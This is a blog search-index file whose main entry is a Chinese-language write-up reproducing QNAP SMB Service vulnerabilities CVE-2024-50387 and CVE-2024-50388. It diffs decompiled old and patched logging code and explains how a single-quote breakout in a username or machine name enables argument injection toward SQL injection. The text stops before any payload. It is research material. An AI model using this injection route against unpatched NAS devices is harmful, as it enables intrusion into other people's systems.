<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>欢迎！</title>
    <url>/2019/09/01/hello-world/</url>
    <content><![CDATA[<p>如果您在文章中发现了任何问题，或有意见和建议，欢迎通过电子邮件与我联系。</p>
<span id="more"></span>

<h2 id="CVE-ID-assigned"><a href="#CVE-ID-assigned" class="headerlink" title="CVE ID assigned"></a>CVE ID assigned</h2><p>CVE-2022-22274 | CVE-2022-22280 | CVE-2022-33869 | CVE-2023-20126 | CVE-2023-23368 | CVE-2023-28962 | CVE-2023-28963 | CVE-2023-31447 | CVE-2023-36636 | CVE-2023-45590 | CVE-2024-23721 | CVE-2024-39565</p>
]]></content>
  </entry>
  <entry>
    <title>CVE-2024-50387 &amp; CVE-2024-50388</title>
    <url>/2024/11/21/QNAP_PWN2OWN_2024/</url>
    <content><![CDATA[<p>本文复现 PWN2OWN 2024 比赛中涉及 QNAP NAS 的两个漏洞 CVE-2024-50387 &amp; CVE-2024-50388</p>
<span id="more"></span>

<p><em>ARM64 架构，存在漏洞的程序可以<a class="link"   href="https://pan.baidu.com/s/1KHkgIYFuyV9MKHsjoXTRLw?pwd=5cf1" >点击这里<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>下载。</em></p>
<h1 id="CVE-2024-50387"><a href="#CVE-2024-50387" class="headerlink" title="CVE-2024-50387"></a>CVE-2024-50387</h1><p>根据<a class="link"   href="https://www.qnap.com.cn/zh-cn/security-advisory/qsa-24-42" >官方公告<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，该漏洞影响 QNAP NAS 中的 SMB Service 插件，从 2024 年开始，QNAP 将原本内建在系统中的 SMB 服务剥离出来，成为一个单独的插件。该漏洞影响插件 4.15.x 版本，从<a class="link"   href="https://www.qnap.com/zh-tw/app_releasenotes/list.php?app_choose=Samba" >历史更新<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>来看，仅影响  4.15.001 和 h4.15.001 两个版本。</p>
<p>根据 ZDI 在比赛中发布的<a class="link"   href="https://securityonline.info/cve-2024-50387-critical-qnap-flaw-exploited-in-hacking-contest-patch-now/" >信息<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，可以知道该漏洞是参数注入 + SQL 注入。考虑插件本身的功能，它主要对外提供 Web 管理接口以及 SMB 服务，而 Web 管理接口是需要权限验证的，因此猜测漏洞存在于 SMB 服务中。而 Samba 是使用非常广泛的开源软件，原版程序不太可能出现此类问题，QNAP 可能对其进行了某些修改， 从而引入了这一个漏洞。</p>
<p>下载最新版的 SMB 插件，和旧版进行补丁对比，发现主要是一些 lib 库发生了变化，逐个分析很快就能找到疑似漏洞点位置，位于 <code>libauth-samba4.so</code> 中。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Old</span></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_A880</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="type">int</span> log_type,</span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="type">char</span> *a2,</span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="type">char</span> *a3,</span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="type">char</span> *remote_machine_name,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> action_type,</span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="type">char</span> *append)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *log_bin; <span class="comment">// x3</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *user; <span class="comment">// x5</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *IP; <span class="comment">// x6</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *computer_name; <span class="comment">// x7</span></span><br><span class="line">  <span class="type">char</span> v17[<span class="number">2048</span>]; <span class="comment">// [xsp+78h] [xbp+58h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v17, <span class="number">0</span>, <span class="keyword">sizeof</span>(v17));</span><br><span class="line">  <span class="keyword">if</span> ( action_type != <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    log_bin = <span class="string">&quot;/sbin/conn_log_tool&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( a2 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">LABEL_11:</span><br><span class="line">    user = <span class="string">&quot;Unknown&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( a3 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">LABEL_12:</span><br><span class="line">    IP = <span class="string">&quot;0.0.0.0&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( remote_machine_name )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">LABEL_13:</span><br><span class="line">    computer_name = <span class="string">&quot;Unknown&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  &#125;</span><br><span class="line">  log_bin = <span class="string">&quot;/usr/local/samba/sbin/log_ratelimit.sh&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !a2 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">LABEL_3:</span><br><span class="line">  <span class="keyword">if</span> ( *a2 == <span class="string">&#x27;\\&#x27;</span> )</span><br><span class="line">    user = a2 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    user = a2;</span><br><span class="line">  <span class="keyword">if</span> ( !a3 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">LABEL_7:</span><br><span class="line">  IP = a3;</span><br><span class="line">  <span class="keyword">if</span> ( !remote_machine_name )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">LABEL_8:</span><br><span class="line">  computer_name = remote_machine_name;</span><br><span class="line">LABEL_9:</span><br><span class="line">  <span class="built_in">snprintf</span>(</span><br><span class="line">    v17,</span><br><span class="line">    <span class="number">0x800</span>uLL,</span><br><span class="line">    <span class="string">&quot;%s -t %d -u &#x27;%s&#x27; -p &#x27;%s&#x27; -m &#x27;%s&#x27; -i %d -n %d -a &#x27;%s&#x27; -S&quot;</span>,</span><br><span class="line">    log_bin,</span><br><span class="line">    log_type,</span><br><span class="line">    user,</span><br><span class="line">    IP,</span><br><span class="line">    computer_name,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    action_type,</span><br><span class="line">    append);</span><br><span class="line">  smbrun(v17, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// New</span></span><br><span class="line"><span class="type">size_t</span> __fastcall <span class="title function_">cmd_filter</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> result; <span class="comment">// x0</span></span><br><span class="line">  __int64 v3; <span class="comment">// x2</span></span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">bool</span> v5; <span class="comment">// cc</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// w1</span></span><br><span class="line"></span><br><span class="line">  result = <span class="built_in">strlen</span>(data);</span><br><span class="line">  <span class="keyword">if</span> ( result &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = data[v3];</span><br><span class="line">        <span class="keyword">if</span> ( (v7 - <span class="number">45</span>) &gt; <span class="number">0x4D</span>u || v7 == <span class="string">&#x27;/&#x27;</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v4 = (v7 - <span class="number">59</span>) &lt;= <span class="number">5u</span> || v7 == <span class="string">&#x27;[&#x27;</span>;</span><br><span class="line">        v5 = !v4 &amp;&amp; (v7 - <span class="number">93</span>) &gt; <span class="number">1u</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v5 || v7 == <span class="string">&#x27;`&#x27;</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( result &lt;= ++v3 )</span><br><span class="line">          <span class="keyword">return</span> result;</span><br><span class="line">      &#125;</span><br><span class="line">      data[v3++] = <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( result &gt; v3 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_A920</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="type">int</span> log_type,</span></span><br><span class="line"><span class="params">        _BYTE *a2,</span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="type">char</span> *a3,</span></span><br><span class="line"><span class="params">        _BYTE *remote_machine_name,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> action_type,</span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="type">char</span> *append)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v12; <span class="comment">// x0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v13; <span class="comment">// x20</span></span><br><span class="line">  __int64 v14; <span class="comment">// x0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *computer_name; <span class="comment">// x22</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *log_bin; <span class="comment">// x3</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *user; <span class="comment">// x5</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *IP; <span class="comment">// x6</span></span><br><span class="line">  __int64 v20; <span class="comment">// x0</span></span><br><span class="line">  __int64 v21; <span class="comment">// x0</span></span><br><span class="line">  <span class="type">char</span> v22[<span class="number">2048</span>]; <span class="comment">// [xsp+78h] [xbp+58h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v22, <span class="number">0</span>, <span class="keyword">sizeof</span>(v22));</span><br><span class="line">  <span class="keyword">if</span> ( a2 &amp;&amp; *a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = _talloc_tos(<span class="string">&quot;../../source3/smbd/qnap_conn_log.c:104&quot;</span>);</span><br><span class="line">    v13 = talloc_strdup(v20, a2);</span><br><span class="line">    <span class="keyword">if</span> ( v13 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = _talloc_tos(<span class="string">&quot;../../source3/smbd/qnap_conn_log.c:101&quot;</span>);</span><br><span class="line">  v13 = talloc_strdup(v12, <span class="string">&quot;Unknown&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v13 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">LABEL_4:</span><br><span class="line">  <span class="keyword">if</span> ( action_type == <span class="number">9</span> )</span><br><span class="line">    cmd_filter(v13);</span><br><span class="line">  <span class="keyword">if</span> ( remote_machine_name &amp;&amp; *remote_machine_name )</span><br><span class="line">  &#123;</span><br><span class="line">    v21 = _talloc_tos(<span class="string">&quot;../../source3/smbd/qnap_conn_log.c:119&quot;</span>);</span><br><span class="line">    computer_name = talloc_strdup(v21, remote_machine_name);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v14 = _talloc_tos(<span class="string">&quot;../../source3/smbd/qnap_conn_log.c:116&quot;</span>);</span><br><span class="line">    computer_name = talloc_strdup(v14, <span class="string">&quot;Unknown&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( computer_name )</span><br><span class="line">  &#123;</span><br><span class="line">    cmd_filter(computer_name);</span><br><span class="line">    <span class="keyword">if</span> ( action_type == <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      log_bin = <span class="string">&quot;/usr/local/samba/sbin/log_ratelimit.sh&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *v13 == <span class="string">&#x27;\\&#x27;</span> )</span><br><span class="line">        user = v13 + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        user = v13;</span><br><span class="line">      <span class="keyword">if</span> ( a3 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      log_bin = <span class="string">&quot;/sbin/conn_log_tool&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *v13 == <span class="number">92</span> )</span><br><span class="line">        user = v13 + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        user = v13;</span><br><span class="line">      <span class="keyword">if</span> ( a3 )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_15:</span><br><span class="line">        IP = a3;</span><br><span class="line">LABEL_16:</span><br><span class="line">        <span class="built_in">snprintf</span>(</span><br><span class="line">          v22,</span><br><span class="line">          <span class="number">0x800</span>uLL,</span><br><span class="line">          <span class="string">&quot;%s -t %d -u &#x27;%s&#x27; -p &#x27;%s&#x27; -m &#x27;%s&#x27; -i %d -n %d -a &#x27;%s&#x27; -S&quot;</span>,</span><br><span class="line">          log_bin,</span><br><span class="line">          log_type,</span><br><span class="line">          user,</span><br><span class="line">          IP,</span><br><span class="line">          computer_name,</span><br><span class="line">          <span class="number">1</span>,</span><br><span class="line">          action_type,</span><br><span class="line">          append);</span><br><span class="line">        smbrun();</span><br><span class="line">        _talloc_free(v13, <span class="string">&quot;../../source3/smbd/qnap_conn_log.c:143&quot;</span>);</span><br><span class="line">        _talloc_free(computer_name, <span class="string">&quot;../../source3/smbd/qnap_conn_log.c:144&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    IP = <span class="string">&quot;0.0.0.0&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">  &#125;</span><br><span class="line">  _talloc_free(v13, <span class="string">&quot;../../source3/smbd/qnap_conn_log.c:122&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个函数是用来记录登录日志的，当 SMB 服务收到一次认证请求，成功或失败，都会调用此函数向系统 Log 数据库插入一条信息，这条信息包括时间、登录用户、客户端名称等。在旧版中，代码获取了必要参数之后，直接将它们拼接到命令中，并使用 smbrun 函数执行。而新版在拼接命令之前对相关参数进行了验证，将一些特殊字符替换为星号。</p>
<p>smbrun 是 Samba 内置的一个函数，用来安全的执行一条命令：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/****************************************************************************</span></span><br><span class="line"><span class="comment"> By default this now sanitizes shell expansion.</span></span><br><span class="line"><span class="comment">****************************************************************************/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">smbrun</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *cmd, <span class="type">int</span> *outfd, <span class="type">char</span> * <span class="type">const</span> *env)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> smbrun_internal(cmd, outfd, <span class="literal">true</span>, env);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">smbrun_internal</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *cmd, <span class="type">int</span> *outfd, <span class="type">bool</span> sanitize,</span></span><br><span class="line"><span class="params">	<span class="type">char</span> * <span class="type">const</span> *env)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* close all other file descriptors, leaving only 0, 1 and 2. 0 and</span></span><br><span class="line"><span class="comment">	   2 point to /dev/null from the startup code */</span></span><br><span class="line">	closefrom(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">char</span> *newcmd = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">if</span> (sanitize) &#123;</span><br><span class="line">			newcmd = escape_shell_string(cmd);</span><br><span class="line">			<span class="keyword">if</span> (!newcmd)</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">82</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (env != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			execle(<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,</span><br><span class="line">				newcmd ? (<span class="type">const</span> <span class="type">char</span> *)newcmd : cmd, <span class="literal">NULL</span>,</span><br><span class="line">				env);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			execl(<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,</span><br><span class="line">				newcmd ? (<span class="type">const</span> <span class="type">char</span> *)newcmd : cmd, <span class="literal">NULL</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		SAFE_FREE(newcmd);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* not reached */</span></span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">83</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>默认情况下 sanitize 参数为 true，函数会调用 <code>escape_shell_string</code> 去过滤命令，将一些危险字符使用反斜杠转义，因此不能直接注入新的命令。但 smbrun 不会转义单引号等字符，所以我们可以传入一些包含单引号的数据，将命令中原本的引号闭合，这样就能控制后续执行程序的参数，实现参数注入。</p>
<p>通过调试分析发现，发送一条 SMB 登录请求会执行 <code>/usr/local/samba/sbin/log_ratelimit.sh</code> 脚本</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If ratelimit is turn-off, simply send to Qulog and early exit.</span></span><br><span class="line">ratelimit_bool=<span class="string">&quot;`/sbin/getcfg Samba &quot;</span>ratelimit bool<span class="string">&quot; -d &quot;</span>TRUE<span class="string">&quot; -u`&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;x<span class="variable">$&#123;ratelimit_bool&#125;</span>&quot;</span> != <span class="string">&quot;xTRUE&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">	/sbin/conn_log_tool <span class="variable">$@</span></span><br><span class="line">	<span class="built_in">exit</span> <span class="string">&quot;$?&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Get ratelimit seconds. default 3 seconds.</span></span><br><span class="line">ratelimit_sec=<span class="string">&quot;`/sbin/getcfg Samba &quot;</span>ratelimit sec<span class="string">&quot; -d &quot;</span>3<span class="string">&quot; -u`&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Init defaults.</span></span><br><span class="line">ret=0        <span class="comment"># return value</span></span><br><span class="line">argv=<span class="string">&quot;<span class="variable">$@</span>&quot;</span>    <span class="comment"># all arguments.  </span></span><br><span class="line">ip=          <span class="comment"># ip address.</span></span><br><span class="line">machine=     <span class="comment"># computer name.</span></span><br><span class="line">username=    <span class="comment"># username. (might contain domain or workgroup)</span></span><br><span class="line">dummy=       <span class="comment"># dummy arguments saved here for debug.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Parse arguments and get client info.</span></span><br><span class="line">POSITIONAL_ARGS=()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> [[ <span class="variable">$#</span> -gt 0 ]]; <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">    -p)</span><br><span class="line">      ip=<span class="string">&quot;<span class="variable">$2</span>&quot;</span></span><br><span class="line">      <span class="built_in">shift</span> <span class="comment"># past argument</span></span><br><span class="line">      <span class="built_in">shift</span> <span class="comment"># past value</span></span><br><span class="line">      ;;</span><br><span class="line">    -m)</span><br><span class="line">      computer=<span class="string">&quot;<span class="variable">$2</span>&quot;</span></span><br><span class="line">      <span class="built_in">shift</span> <span class="comment"># past argument</span></span><br><span class="line">      <span class="built_in">shift</span> <span class="comment"># past value</span></span><br><span class="line">      ;;</span><br><span class="line">    -u)</span><br><span class="line">      <span class="comment"># If username&#x27;s prefix contains domain as &#x27;&lt;DOMAIN&gt;\&lt;USER&gt;&#x27;,</span></span><br><span class="line">      <span class="comment"># replace backslash as semicolon, as &#x27;&lt;DOMAIN&gt;:&lt;USER&gt;&#x27; for valid grep.</span></span><br><span class="line">      username=`<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$2</span>&quot;</span> | sed <span class="string">&#x27;s/\\\\/:/g&#x27;</span> 2&gt;/dev/null`</span><br><span class="line">      <span class="built_in">shift</span> <span class="comment"># past argument</span></span><br><span class="line">      <span class="built_in">shift</span> <span class="comment"># past value</span></span><br><span class="line">      ;;</span><br><span class="line">    -*)</span><br><span class="line">      <span class="comment"># echo &quot;Unknown option $1&quot;</span></span><br><span class="line">      <span class="comment"># exit 1</span></span><br><span class="line">      dummy=<span class="string">&quot;<span class="variable">$2</span>&quot;</span></span><br><span class="line">      <span class="built_in">shift</span> <span class="comment"># past argument</span></span><br><span class="line">      <span class="built_in">shift</span> <span class="comment"># past value</span></span><br><span class="line">      ;;</span><br><span class="line">    *)</span><br><span class="line">      POSITIONAL_ARGS+=(<span class="string">&quot;<span class="variable">$1</span>&quot;</span>) <span class="comment"># save positional arg</span></span><br><span class="line">      <span class="built_in">shift</span> <span class="comment"># past argument</span></span><br><span class="line">      ;;</span><br><span class="line">  <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate keyword from client info.</span></span><br><span class="line">keyword=<span class="string">&quot;<span class="variable">$&#123;username&#125;</span>:<span class="variable">$&#123;ip&#125;</span>:<span class="variable">$&#123;computer&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DEBUG.</span></span><br><span class="line"><span class="comment">#echo $&#123;keyword&#125; &gt;&gt; /tmp/samba_log_ratelimit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Lookup. Bypass if the same log is sent.</span></span><br><span class="line"><span class="keyword">for</span> pid <span class="keyword">in</span> `pidof <span class="built_in">sleep</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  <span class="comment"># Check keyword, case insensitive.</span></span><br><span class="line">  grep -i <span class="string">&quot;CMD=<span class="variable">$&#123;keyword&#125;</span>&quot;</span> /proc/<span class="string">&quot;<span class="variable">$&#123;pid&#125;</span>&quot;</span>/environ 2&gt;&amp;1 &gt;/dev/null</span><br><span class="line">  <span class="keyword">if</span> [ x$? == x0 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># Found the same log is sent. Bypass.</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Send to Qulog. Insert a record for lookup. Run in background to avoid blocking parent.</span></span><br><span class="line">(/sbin/conn_log_tool <span class="variable">$argv</span> &amp;&amp; CMD=<span class="string">&quot;<span class="variable">$&#123;keyword&#125;</span>&quot;</span> <span class="built_in">sleep</span> <span class="string">&quot;<span class="variable">$&#123;ratelimit_sec&#125;</span>&quot;</span>) &amp;</span><br><span class="line">ret=<span class="string">&quot;$?&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> <span class="string">&quot;<span class="variable">$&#123;ret&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>实际上最后也是执行 <code>/sbin/conn_log_tool</code>，脚本只是为了限制发送日志的频率。执行的命令模式为</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">/usr/local/samba/sbin/log_ratelimit.sh -t 1 -u <span class="string">&#x27;&lt;用户名&gt;&#x27;</span> -p <span class="string">&#x27;&lt;客户端 IP 地址&gt;&#x27;</span> -m <span class="string">&#x27;&lt;客户端主机名&gt;&#x27;</span> -i 1 -n 9 -a <span class="string">&#x27;---&#x27;</span> -S</span><br></pre></td></tr></table></figure></div>

<p><code>/sbin/conn_log_tool</code> 是指向 <code>/sbin/log_tool</code> 的符号链接，分析 <code>log_tool</code> 程序，它会获取一系列参数，当包含 <code>-a</code> 参数时，会执行以下代码</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( append == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(v77, <span class="number">0</span>, <span class="keyword">sizeof</span>(v77));</span><br><span class="line">  *&amp;v77[<span class="number">4</span>] = qword_41A560;</span><br><span class="line">  <span class="keyword">if</span> ( qword_41A568 )</span><br><span class="line">    <span class="built_in">strncpy</span>(&amp;v77[<span class="number">64</span>], qword_41A568, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( qword_41A570 )</span><br><span class="line">    <span class="built_in">strncpy</span>(&amp;v77[<span class="number">129</span>], qword_41A570, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( qword_41A578 )</span><br><span class="line">    <span class="built_in">strncpy</span>(&amp;v77[<span class="number">194</span>], qword_41A578, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( qword_41A5C0 )</span><br><span class="line">    <span class="built_in">strncpy</span>(&amp;v77[<span class="number">1556</span>], qword_41A5C0, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( qword_41A5C8 )</span><br><span class="line">    <span class="built_in">strncpy</span>(&amp;v77[<span class="number">1621</span>], qword_41A5C8, <span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( qword_41A5D0 )</span><br><span class="line">    <span class="built_in">strncpy</span>(&amp;v77[<span class="number">1750</span>], qword_41A5D0, <span class="number">0xFF</span>uLL);</span><br><span class="line">  <span class="built_in">strncpy</span>(&amp;v77[<span class="number">259</span>], qword_41A558, <span class="number">0x400</span>uLL);</span><br><span class="line">  *&amp;v77[<span class="number">1284</span>] = dword_41A580;</span><br><span class="line">  *&amp;v77[<span class="number">1288</span>] = dword_41A584;</span><br><span class="line">  *&amp;v77[<span class="number">1552</span>] = qword_41A5B8;</span><br><span class="line">  <span class="keyword">if</span> ( append_msg )</span><br><span class="line">    <span class="built_in">strncpy</span>(&amp;v77[<span class="number">1292</span>], append_msg, <span class="number">0x100</span>uLL);    <span class="comment">// [1]</span></span><br><span class="line">  <span class="keyword">if</span> ( verbose )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Appending a log to database...&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( log_engine == <span class="number">1</span> )                          <span class="comment">// [2]</span></span><br><span class="line">  &#123;</span><br><span class="line">    v66 = &amp;v77[<span class="number">1750</span>];</span><br><span class="line">    v67 = &amp;v77[<span class="number">259</span>];</span><br><span class="line">    v64 = &amp;v77[<span class="number">1556</span>];</span><br><span class="line">    v65 = &amp;v77[<span class="number">1621</span>];</span><br><span class="line">    v22 = SendConnToLogEngineEx4();               <span class="comment">// [3]</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v22 = (naslog_conn_add2)(v77);                <span class="comment">// [4]</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !verbose )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

<p>在 <code>[1]</code> 处，判断是否传入了 <code>-A</code> 参数，如果是，就把这个参数值保存到结构体 v77 中。在 <code>[2]</code> 处，判断是否传入了 <code>-S</code> 参数，根据前面的命令模式知道正常情况下会进入这个 if 条件，从而执行 <code>SendConnToLogEngineEx4</code> 函数。</p>
<p><code>SendConnToLogEngineEx4</code> 调用 msgsnd 向消息队列发送一条消息，最终会由 qLogEngined 进程来处理，观察到它会调用 <code>naslog_conn_add_entries2</code> 向数据库添加数据，这个函数定义在 <code>libuLinux_naslog.so.2.0.0</code> 中</p>
